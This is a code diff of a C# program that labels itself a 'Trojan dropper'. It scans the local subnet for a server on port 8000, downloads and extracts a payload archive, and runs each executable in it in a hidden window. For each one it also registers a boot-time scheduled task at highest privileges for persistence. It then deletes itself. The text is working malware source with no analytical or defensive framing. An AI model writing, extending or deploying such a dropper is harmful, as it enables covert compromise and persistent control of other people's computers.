@@ -2,30 +2,32 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Reflection;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.IO.Compression;
 
 namespace App
 {
-    // --- New Logger Class ---
+    // --- MODIFIED: Logger class updated for new file name format ---
     public static class Logger
     {
         private static string _logFilePath;
-        private static object _lock = new object();
+        private static readonly object _lock = new object();
         private static bool _initialized = false;
 
         public static void Initialize(string baseDirectory)
         {
             if (_initialized) return;
 
-            _logFilePath = Path.Combine(baseDirectory, $"AppLog_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
+            // Use the agreed-upon file name format
+            string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
+            _logFilePath = Path.Combine(baseDirectory, $"Trojan_log_{timestamp}.txt");
+
             _initialized = true;
             Log("Logger initialized. Log file: " + _logFilePath);
         }
@@ -33,7 +35,7 @@ namespace App
         public static void Log(string message)
         {
             string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
-            Console.WriteLine(logEntry); // Always write to console
+            Console.WriteLine(logEntry); // Always write to console for real-time view
 
             if (_initialized)
             {
@@ -45,48 +47,45 @@ namespace App
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine($"[LOGGER ERROR] Failed to write to log file: {ex.Message}");
+                        Console.WriteLine($"[LOGGER CRITICAL ERROR] Failed to write to log file: {ex.Message}");
                     }
                 }
             }
         }
     }
-    // --- End New Logger Class ---
-
 
     internal class Program
     {
         private const int TargetPort = 8000;
-        private const int ScanTimeoutMs = 100; // Timeout for each port scan attempt (milliseconds)
-        private const int MaxParallelScans = 50; // Limit concurrent scanning tasks to avoid overwhelming the network
-        private static bool serverFoundAndDownloaded = false; // Flag to stop scanning once successful
+        private const int ScanTimeoutMs = 100;
+        private const int MaxParallelScans = 50;
+        private static bool serverFoundAndDownloaded = false;
         private const string PayloadZipFileName = "payload.zip";
-        private const string PayloadExtractDir = "BotPayload";
-        private const string MainExecutableName = "BotClient.exe";
 
-        // New helper to get the local IP address
+        // --- MODIFIED: Renamed payload directory ---
+        private const string PayloadExtractDir = "payload";
+
         private static IPAddress GetLocalIPAddress()
         {
             foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
             {
-                // Consider only active Ethernet or Wi-Fi interfaces
                 if (ni.OperationalStatus == OperationalStatus.Up &&
                     (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                      ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                 {
                     foreach (IPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                     {
-                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork) // IPv4
+                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                         {
                             return ip.Address;
                         }
                     }
                 }
             }
-            return null; // No suitable IP found
+            return null;
         }
 
-        private static async Task<string> FindServerIpAsync() // No longer takes ipRangeStart/End as args
+        private static async Task<string> FindServerIpAsync()
         {
             Logger.Log("Attempting to determine local IP range for scanning...");
             IPAddress localIp = GetLocalIPAddress();
@@ -94,15 +93,11 @@ namespace App
             if (localIp == null)
             {
                 Logger.Log("Could not determine local IP address. Cannot scan local network.");
-                Logger.Log("Please ensure network connection is active.");
                 return null;
             }
 
             Logger.Log($"Local IP detected: {localIp}");
             byte[] ipBytes = localIp.GetAddressBytes();
-
-            // Construct a Class C subnet range based on the local IP (e.g., 192.168.1.x)
-            // This assumes a /24 subnet mask.
             string ipRangeStart = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.1";
             string ipRangeEnd = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.254";
 
@@ -111,9 +106,9 @@ namespace App
             List<Task<string>> scanTasks = new List<Task<string>>();
             SemaphoreSlim semaphore = new SemaphoreSlim(MaxParallelScans);
 
-            for (int i = 1; i <= 254; i++) // Iterate from .1 to .254
+            for (int i = 1; i <= 254; i++)
             {
-                if (serverFoundAndDownloaded) break; // Stop scanning if server is found
+                if (serverFoundAndDownloaded) break;
 
                 string currentIp = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.{i}";
 
@@ -124,24 +119,17 @@ namespace App
                     {
                         if (serverFoundAndDownloaded) return null;
 
-                        // Logger.Log($"Checking {currentIp}:{TargetPort}..."); // Can be noisy
                         using (var client = new TcpClient())
                         {
                             var connectTask = client.ConnectAsync(IPAddress.Parse(currentIp), TargetPort);
-                            var completedTask = await Task.WhenAny(connectTask, Task.Delay(ScanTimeoutMs));
-
-                            if (completedTask == connectTask && client.Connected)
+                            if (await Task.WhenAny(connectTask, Task.Delay(ScanTimeoutMs)) == connectTask && client.Connected)
                             {
-                                Logger.Log($"[FOUND] Open port {TargetPort} at {currentIp}");
+                                Logger.Log($"[SUCCESS] Found server with open port {TargetPort} at {currentIp}");
                                 return currentIp;
                             }
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        // Specific errors like "No connection could be made because the target machine actively refused it" are normal for closed ports
-                        // Logger.Log($"Error checking {currentIp}: {ex.Message}"); 
-                    }
+                    catch { /* Ignore exceptions for closed ports */ }
                     finally
                     {
                         semaphore.Release();
@@ -150,7 +138,6 @@ namespace App
                 }));
             }
 
-            // Wait for any task to find a server or all tasks to complete
             while (scanTasks.Any() && !serverFoundAndDownloaded)
             {
                 var completedTask = await Task.WhenAny(scanTasks);
@@ -168,110 +155,11 @@ namespace App
             return null;
         }
 
-
-        //private static void DownloadAndRunFile(string download_url, string save_path, string serverIp)
-        //{
-        //    Logger.Log($"Attempting download: {download_url} -> {save_path}");
-
-        //    try
-        //    {
-        //        string destDir = Path.GetDirectoryName(save_path) ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-        //        if (!Directory.Exists(destDir))
-        //            Directory.CreateDirectory(destDir);
-
-        //        if (File.Exists(save_path))
-        //        {
-        //            try
-        //            {
-        //                File.SetAttributes(save_path, FileAttributes.Normal);
-        //                File.Delete(save_path);
-        //                Logger.Log("Deleted existing file at destination.");
-        //            }
-        //            catch (Exception delEx)
-        //            {
-        //                Logger.Log("Warning: could not delete existing file: " + delEx.Message);
-        //            }
-        //        }
-
-        //        using (var client = new WebClient())
-        //        {
-        //            client.Proxy = null;
-        //            client.DownloadFile(download_url, save_path);
-        //        }
-
-        //        Logger.Log("Download succeeded with WebClient.");
-        //        Logger.Log("Saved file location: " + save_path);
-
-        //        try
-        //        {
-        //            File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
-        //        }
-        //        catch (Exception attrEx)
-        //        {
-        //            Logger.Log("Could not set attributes: " + attrEx.Message);
-        //        }
-
-        //        try
-        //        {
-        //            Logger.Log("Starting downloaded file...");
-        //            Process.Start(new ProcessStartInfo { FileName = save_path, Arguments = serverIp, UseShellExecute = true });
-        //        }
-        //        catch (Exception startEx)
-        //        {
-        //            Logger.Log("Failed to start the downloaded file: " + startEx.Message);
-        //        }
-        //    }
-        //    catch (Exception exWebClient)
-        //    {
-        //        Logger.Log("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
-        //        Logger.Log("Trying HttpWebRequest fallback...");
-
-        //        try
-        //        {
-        //            var req = (HttpWebRequest)WebRequest.Create(download_url);
-        //            req.Proxy = null;
-        //            using (var resp = (HttpWebResponse)req.GetResponse())
-        //            using (var stream = resp.GetResponseStream())
-        //            using (var fs = new FileStream(save_path, FileMode.Create, FileAccess.Write))
-        //            {
-        //                stream.CopyTo(fs);
-        //            }
-
-        //            Logger.Log("Download succeeded with HttpWebRequest fallback.");
-        //            Logger.Log("Saved file location: " + save_path);
-
-        //            try
-        //            {
-        //                File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
-        //            }
-        //            catch (Exception attrEx2)
-        //            {
-        //                Logger.Log("Could not set attributes: " + attrEx2.Message);
-        //            }
-
-        //            try
-        //            {
-        //                Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
-        //            }
-        //            catch (Exception startEx2)
-        //            {
-        //                Logger.Log("Failed to start the downloaded file: " + startEx2.Message);
-        //            }
-        //        }
-        //        catch (Exception exFallback)
-        //        {
-        //            Logger.Log("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
-        //            Logger.Log("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
-        //        }
-        //    }
-        //}
-        private static async Task DownloadAndExtractPayloadAsync(string serverIp)
+        private static async Task<bool> DownloadAndExtractPayloadAsync(string serverIp, string extractPath)
         {
             string downloadUrl = $"http://{serverIp}:{TargetPort}/{PayloadZipFileName}";
             string zipSavePath = Path.Combine(AppContext.BaseDirectory, PayloadZipFileName);
-            string extractPath = Path.Combine(AppContext.BaseDirectory, PayloadExtractDir);
 
-            // 1. Tải file ZIP
             try
             {
                 Logger.Log($"Attempting to download payload from {downloadUrl}...");
@@ -284,53 +172,123 @@ namespace App
             catch (Exception ex)
             {
                 Logger.Log($"FATAL: Failed to download payload: {ex.Message}");
-                return; // Dừng lại nếu không tải được
+                return false;
             }
 
-            // 2. Giải nén file ZIP
             try
             {
-                Logger.Log($"Extracting payload to {extractPath}...");
+                Logger.Log($"Extracting payload to '{extractPath}'...");
                 if (Directory.Exists(extractPath))
                 {
-                    Directory.Delete(extractPath, true); // Xóa thư mục cũ nếu tồn tại
+                    Directory.Delete(extractPath, true);
                 }
                 ZipFile.ExtractToDirectory(zipSavePath, extractPath);
                 Logger.Log("Payload extracted successfully.");
+                return true;
             }
             catch (Exception ex)
             {
                 Logger.Log($"FATAL: Failed to extract payload: {ex.Message}");
-                return;
+                return false;
             }
             finally
             {
-                File.Delete(zipSavePath); // Xóa file zip sau khi giải nén
-            }
-
-            // 3. Chạy file thực thi chính
-            string exePath = Path.Combine(extractPath, MainExecutableName);
-            if (File.Exists(exePath))
-            {
-                Logger.Log($"Found main executable at {exePath}. Starting with argument: {serverIp}");
-                Process.Start(new ProcessStartInfo
+                if (File.Exists(zipSavePath))
                 {
-                    FileName = exePath,
-                    Arguments = serverIp,
-                    UseShellExecute = true,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-            }
-            else
-            {
-                Logger.Log($"FATAL: Main executable '{MainExecutableName}' not found in extracted payload.");
+                    File.Delete(zipSavePath);
+                }
             }
         }
+
+        // --- NEW: Helper method to create scheduled tasks ---
+        private static void CreateScheduledTask(string exePath, string taskName, string serverIp)
+        {
+            Logger.Log($"Attempting to create scheduled task '{taskName}' for '{Path.GetFileName(exePath)}'");
+
+            // Command to delete any existing task with the same name
+            string deleteArgs = $"/Delete /TN \"{taskName}\" /F";
+            var deleteInfo = new ProcessStartInfo("schtasks.exe", deleteArgs)
+            {
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+            Process.Start(deleteInfo)?.WaitForExit();
+
+            // Command to create the new task
+            // /SC ONSTART: Runs when the system boots
+            // /RL HIGHEST: Runs with highest available privileges for the user
+            // /TR: The command to run, with quotes to handle spaces and the server IP as an argument
+            string createArgs = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\" \\\"{serverIp}\\\"\" /RL HIGHEST /F";
+            var createInfo = new ProcessStartInfo("schtasks.exe", createArgs)
+            {
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                RedirectStandardOutput = true,
+                UseShellExecute = false
+            };
+
+            using (var process = Process.Start(createInfo))
+            {
+                process.WaitForExit();
+                if (process.ExitCode == 0)
+                {
+                    Logger.Log($"[SUCCESS] Scheduled task '{taskName}' created successfully.");
+                }
+                else
+                {
+                    Logger.Log($"[ERROR] Failed to create scheduled task '{taskName}'. Exit code: {process.ExitCode}");
+                }
+            }
+        }
+
+        // --- NEW: Core logic to create tasks and execute all payloads ---
+        private static void CreateTasksAndExecutePayloads(string extractPath, string serverIp)
+        {
+            Logger.Log("Scanning for executables in payload directory...");
+            string[] executables = Directory.GetFiles(extractPath, "*.exe", SearchOption.AllDirectories);
+
+            if (executables.Length == 0)
+            {
+                Logger.Log("[WARNING] No .exe files found in the payload directory.");
+                return;
+            }
+
+            Logger.Log($"Found {executables.Length} executables. Processing each...");
+
+            foreach (string exePath in executables)
+            {
+                string exeName = Path.GetFileName(exePath);
+                string taskName = $"Malicious_{Path.GetFileNameWithoutExtension(exeName)}";
+
+                // 1. Create the scheduled task for persistence
+                CreateScheduledTask(exePath, taskName, serverIp);
+
+                // 2. Execute the payload immediately
+                try
+                {
+                    Logger.Log($"Executing '{exeName}' immediately...");
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = exePath,
+                        Arguments = serverIp,
+                        UseShellExecute = true,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    });
+                    Logger.Log($"'{exeName}' has been launched in the background.");
+                }
+                catch (Exception ex)
+                {
+                    Logger.Log($"[ERROR] Failed to execute '{exeName}': {ex.Message}");
+                }
+            }
+        }
+
         private static void SelfDelete()
         {
             try
             {
+                Logger.Log("Scheduling self-deletion in 3 seconds...");
                 Process.Start(new ProcessStartInfo
                 {
                     Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" +
@@ -342,35 +300,42 @@ namespace App
             }
             catch (Exception ex)
             {
-                Logger.Log($"Self-delete failed: {ex.Message}");
+                Logger.Log($"[ERROR] Self-delete failed: {ex.Message}");
             }
         }
 
-        static async Task Main() // Still async Task Main
+        static async Task Main()
         {
-            // --- Initialize the Logger first ---
+            // --- MODIFIED: Main logic flow updated to match our plan ---
             Logger.Initialize(AppContext.BaseDirectory);
-            Logger.Log("Application started.");
-            // -----------------------------------
+            Logger.Log("Trojan dropper started.");
 
-            // The IP range is now determined dynamically
             string foundServerIp = await FindServerIpAsync();
 
             if (!string.IsNullOrEmpty(foundServerIp))
             {
-                //string downloadUrl = $"http://{foundServerIp}:{TargetPort}/test.exe";
-                //string savePath = Path.Combine(AppContext.BaseDirectory, "bot_payload.exe");
-                //DownloadAndRunFile(downloadUrl, savePath, foundServerIp);
-                await DownloadAndExtractPayloadAsync(foundServerIp);
+                string extractPath = Path.Combine(AppContext.BaseDirectory, PayloadExtractDir);
+                bool success = await DownloadAndExtractPayloadAsync(foundServerIp, extractPath);
+
+                if (success)
+                {
+                    Logger.Log("Payload deployed. Creating persistence and executing...");
+                    CreateTasksAndExecutePayloads(extractPath, foundServerIp);
+
+                    Logger.Log("All tasks completed. Initiating self-deletion.");
+                    SelfDelete();
+                }
+                else
+                {
+                    Logger.Log("Payload deployment failed. Aborting.");
+                }
             }
             else
             {
-                Logger.Log("Could not find an accessible server for test.exe on the local network.");
+                Logger.Log("Could not find an accessible server. Aborting.");
             }
 
-            Logger.Log("Finished. Press Enter to exit.");
-            // Console.ReadLine() is still useful for interactive debugging, but won't be logged by the Logger directly
-            Console.ReadLine();
+            Logger.Log("Dropper has finished its tasks and will now exit.");
         }
     }
 }
